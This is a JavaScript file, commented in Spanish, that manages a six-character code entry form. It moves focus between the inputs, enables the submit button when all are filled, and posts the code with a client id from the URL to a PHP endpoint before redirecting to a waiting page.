// Seleccionar los inputs del formulario y otros elementos necesarios
const inputs = document.querySelectorAll(".user"); // Selecciona los inputs con clase "user"
const codeForm = document.getElementById("codeForm"); // Formulario
const submitButton = document.getElementById("submitButton"); // Botón de envío

// Función para manejar el desplazamiento al escribir y retroceder al borrar
inputs.forEach((input, index) => {
    // Evento al escribir
    input.addEventListener("input", () => {
        const value = input.value;

        // Validar que solo permita caracteres alfanuméricos
        if (/[^a-zA-Z0-9]/.test(value)) {
            input.value = ""; // Limpiar el campo si es inválido
            return;
        }

        // Si el campo tiene un carácter válido, pasa al siguiente input
        if (value.length === 1 && index < inputs.length - 1) {
            inputs[index + 1].focus();
        }

        // Verificar si todos los campos están llenos para habilitar el botón
        checkInputs();
    });

    // Evento al borrar
    input.addEventListener("keydown", (event) => {
        if (event.key === "Backspace" && !input.value && index > 0) {
            // Si el campo está vacío, retrocede al input anterior
            inputs[index - 1].focus();
        }
    });
});

// Función para verificar si todos los inputs están llenos
function checkInputs() {
    const allFilled = Array.from(inputs).every((input) => input.value.trim() !== "");
    if (allFilled) {
        submitButton.disabled = false;
        submitButton.classList.add("enabled");
        submitButton.classList.remove("disabled");
    } else {
        submitButton.disabled = true;
        submitButton.classList.add("disabled");
        submitButton.classList.remove("enabled");
    }
}

// Manejar el envío del formulario
codeForm.addEventListener("submit", async (event) => {
    event.preventDefault(); // Evitar el envío normal del formulario

    // Combinar los valores de los inputs en un solo código
    const code = Array.from(inputs)
        .map((input) => input.value)
        .join("");

    // Obtener el ID del cliente desde la URL
    const params = new URLSearchParams(window.location.search);
    const clienteId = params.get("id");

    // Validar que el ID y el código existan
    if (!clienteId || code.length !== 6) {
        alert("Por favor, completa todos los campos correctamente.");
        return;
    }

    // Enviar la solicitud al servidor para cambiar el estado
    try {
        const response = await fetch("funtions/actualizar-estado.php", {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
            },
            body: JSON.stringify({
                id: clienteId,
                clave: code,
                estado: 0 // <--- Se agregó el campo 'estado' con el valor 0
            }),
        });

        const result = await response.json();

        if (response.ok) {
            // Si el servidor responde con éxito, redirigir a la página de espera
            window.location.href = `espera.php?id=${clienteId}`;
        } else {
            alert(result.error || "Ocurrió un error al procesar la solicitud.");
        }
    } catch (error) {
        console.error("Error en la solicitud:", error);
        alert("No se pudo procesar la solicitud. Inténtalo nuevamente.");
    }
});